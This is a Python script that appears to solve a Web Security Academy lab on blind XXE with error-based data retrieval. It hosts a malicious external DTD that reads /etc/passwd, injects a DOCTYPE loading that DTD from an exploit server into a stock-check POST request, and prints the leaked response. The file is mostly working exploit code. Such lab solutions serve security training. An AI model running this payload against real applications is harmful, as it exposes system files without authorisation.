from web_security_academy.core.logger import logger
from lxml import etree


def solve_lab(session):
    exploit_server = session.exploit_server()
    head = ["HTTP/1.0 200 OK", "Content-Type: text/xml; charset=utf-8"]
    body = [
        '<!ENTITY % file SYSTEM "file:///etc/passwd">',
        f"<!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">",
        "%eval;",
        "%error;",
    ]
    exploit_server.craft_response("/malicious.dtd", "\n".join(head), "\n".join(body))

    path = "/product/stock"

    doctype = f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{exploit_server.url}/malicious.dtd"> %xxe;]>'
    stock_check = etree.Element("stockCheck")
    etree.SubElement(stock_check, "productId").text = "1"
    etree.SubElement(stock_check, "storeId").text = "1"

    data = etree.tostring(
        stock_check, encoding="UTF-8", xml_declaration=True, doctype=doctype
    )
    data = data.decode()

    logger.info(
        f'Injecting an XML external entity with the following POST request data to "{path}":'
    )
    print(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("XXE injection successful with the following response:")
    print(f"{resp.text}")
